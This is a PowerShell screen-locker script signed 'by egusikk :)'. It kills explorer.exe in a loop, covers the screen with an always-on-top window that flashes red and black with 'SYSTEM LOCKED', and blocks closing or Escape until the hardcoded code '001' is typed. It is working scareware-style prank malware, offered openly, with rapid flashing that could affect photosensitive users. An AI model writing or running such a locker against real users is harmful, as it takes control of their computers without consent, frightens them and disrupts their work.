Add-Type -AssemblyName PresentationFramework
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

$global:Unlocked = $false

$BlockExplorerJob = {
    while ($true) {
        $explorer = Get-Process -Name "explorer" -ErrorAction SilentlyContinue
        if ($explorer) {
            Stop-Process -Name "explorer" -Force -ErrorAction SilentlyContinue
        }
        Start-Sleep -Milliseconds 300
    }
}
$job = Start-Job -ScriptBlock $BlockExplorerJob

function Show-RedFlashingScreen {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk :)"
    $form.WindowState = "Maximized"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::Red
    $form.KeyPreview = $true

    $mainLabel = New-Object System.Windows.Forms.Label
    $mainLabel.Text = "SYSTEM LOCKED"
    $mainLabel.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
    $mainLabel.AutoSize = $true
    $form.Controls.Add($mainLabel)

    $spaceLabel = New-Object System.Windows.Forms.Label
    $spaceLabel.Text = "PRESS SPACE"
    $spaceLabel.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
    $spaceLabel.AutoSize = $true
    $form.Controls.Add($spaceLabel)

    $form.Add_Resize({
        $mainLabel.Left = ($form.ClientSize.Width - $mainLabel.Width) / 2
        $mainLabel.Top = ($form.ClientSize.Height - $mainLabel.Height) / 2 - 60
        $spaceLabel.Left = ($form.ClientSize.Width - $spaceLabel.Width) / 2
        $spaceLabel.Top = $form.ClientSize.Height - 100
    })

    # Мигание 0.4 секунды: фон чёрный+текст красный ↔ фон красный+текст чёрный
    $global:flashTimer = New-Object System.Windows.Forms.Timer
    $global:flashTimer.Interval = 400
    $global:isRed = $true

    $global:flashTimer.Add_Tick({
        if ($global:isRed) {
            $form.BackColor = [System.Drawing.Color]::Black
            $mainLabel.ForeColor = [System.Drawing.Color]::Red
            $spaceLabel.ForeColor = [System.Drawing.Color]::Red
        } else {
            $form.BackColor = [System.Drawing.Color]::Red
            $mainLabel.ForeColor = [System.Drawing.Color]::Black
            $spaceLabel.ForeColor = [System.Drawing.Color]::Black
        }
        $global:isRed = !$global:isRed
    })

    $global:flashTimer.Start()

    $form.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Space) {
            $global:flashTimer.Stop()
            $form.Close()
        }
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
        }
    })

    $form.Add_Shown({ $form.Activate() })
    $form.ShowDialog() | Out-Null
    $global:flashTimer.Stop()
}

function Show-PasswordWindow {
    $form = New-Object System.Windows.Forms.Form
    $form.Text = "by egusikk :)"
    $form.WindowState = "Maximized"
    $form.FormBorderStyle = "None"
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::Black
    $form.KeyPreview = $true

    $titleLabel = New-Object System.Windows.Forms.Label
    $titleLabel.Text = "by egusikk :) good luck"
    $titleLabel.ForeColor = [System.Drawing.Color]::White
    $titleLabel.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
    $titleLabel.AutoSize = $true
    $form.Controls.Add($titleLabel)

    $textBox = New-Object System.Windows.Forms.TextBox
    $textBox.Font = New-Object System.Drawing.Font("Consolas", 22, [System.Drawing.FontStyle]::Bold)
    $textBox.PasswordChar = "*"
    $textBox.BackColor = [System.Drawing.Color]::Black
    $textBox.ForeColor = [System.Drawing.Color]::White
    $textBox.Width = 340
    $form.Controls.Add($textBox)

    $button = New-Object System.Windows.Forms.Button
    $button.Text = "UNLOCK"
    $button.Font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
    $button.BackColor = [System.Drawing.Color]::FromArgb(50,50,50)
    $button.ForeColor = [System.Drawing.Color]::White
    $button.FlatStyle = "Flat"
    $button.FlatAppearance.BorderSize = 1
    $button.Width = 160
    $form.Controls.Add($button)

    $global:bgTimer = New-Object System.Windows.Forms.Timer
    $global:bgTimer.Interval = 400
    $global:isBgRed = $true

    $global:bgTimer.Add_Tick({
        if ($global:isBgRed) {
            $form.BackColor = [System.Drawing.Color]::Black
        } else {
            $form.BackColor = [System.Drawing.Color]::Red
        }
        $global:isBgRed = !$global:isBgRed
    })
    $global:bgTimer.Start()

    $form.Add_Resize({
        $titleLabel.Left = ($form.ClientSize.Width - $titleLabel.Width) / 2
        $titleLabel.Top = ($form.ClientSize.Height / 2) - 110

        $textBox.Left = ($form.ClientSize.Width - $textBox.Width) / 2
        $textBox.Top = ($form.ClientSize.Height / 2) - 30

        $button.Left = ($form.ClientSize.Width - $button.Width) / 2
        $button.Top = ($form.ClientSize.Height / 2) + 50
    })

    $UnlockAction = {
        if ($textBox.Text -eq "001") {
            $global:Unlocked = $true
            $global:bgTimer.Stop()
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("INCORRECT CODE!", "ERROR", 
                [System.Windows.Forms.MessageBoxButtons]::OK, 
                [System.Windows.Forms.MessageBoxIcon]::Error)
            $textBox.Clear()
            $textBox.Focus()
        }
    }

    $button.Add_Click($UnlockAction)

    $textBox.Add_KeyDown({
        param($_, $e)
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
            & $UnlockAction
        }
        if ($e.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $e.Handled = $true
        }
    })

    $form.Add_KeyDown({
        if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Escape) {
            $_.Handled = $true
        }
    })

    $form.Add_FormClosing({
        param($_, $e)
        if (-not $global:Unlocked) { $e.Cancel = $true }
    })

    $form.Add_Shown({
        $form.Activate()
        $textBox.Focus()
    })

    $form.ShowDialog() | Out-Null
    $global:bgTimer.Stop()
}

Show-RedFlashingScreen
Show-PasswordWindow

if ($global:Unlocked -eq $true) {
    Stop-Job $job
    Remove-Job $job
    Start-Process "explorer.exe"
}
